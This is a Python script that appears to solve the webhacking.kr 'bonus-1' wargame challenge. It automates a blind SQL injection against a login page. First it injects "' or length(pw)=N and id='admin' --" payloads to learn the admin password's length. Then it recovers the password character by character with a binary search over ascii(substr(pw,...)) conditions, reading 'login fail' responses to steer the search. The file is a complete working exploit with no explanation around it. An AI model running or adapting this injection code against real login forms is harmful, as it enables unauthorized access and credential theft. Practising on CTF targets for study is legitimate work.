import requests

url = "https://webhacking.kr/challenge/bonus-1/index.php"
params = {
    'id' : '12345',
    'pw' : ''
}



def get_password_length():
    for i in range(34,100):
        injection_string = "' or length(pw) = {} and id='admin' -- ".format(str(i))
        params['pw'] = injection_string
        response = requests.get(url,params=params)
        
        if('wrong password' in response.text):
            print("find password length")
            return i


def get_password(password_length):
    password = ''
    for i in range(1,password_length+1):
        left,right = 32,127 
        while(1):
            search = int((left + right)/2)
#            print(search)
            injection_string = "' or id='admin' and ascii(substr(pw,{},1)) < {}--  ".format(i,search)
            params['pw'] = injection_string
            response = requests.get(url,params=params)
            # 위의 식이 틀렸다는 말이니까 search를 더 크게 만들어야 한다. left를 바꾼다
            if('login fail' in response.text):
                left = int((left + right)/2)
            else:
                right = int((left + right)/2)
            
            if(left == right):
                print(chr(left))
                password += chr(left)
                break
            if(left == (right -1)):
                injection_string = "' or id='admin' and ascii(substr(pw,{},1)) = {}--  ".format(i,left)
                params['pw'] = injection_string
                response = requests.get(url,params=params)
                if('login fail' in response.text):
                    print(chr(right))
                    password +=chr(right)
                    break
                else:
                    print(chr(left))
                    password +=chr(left)
                    break
    return password


def main():
    password_length = get_password_length()
    password = get_password(password_length)
    print("result : {}".format(password))


if __name__ == '__main__':
    main()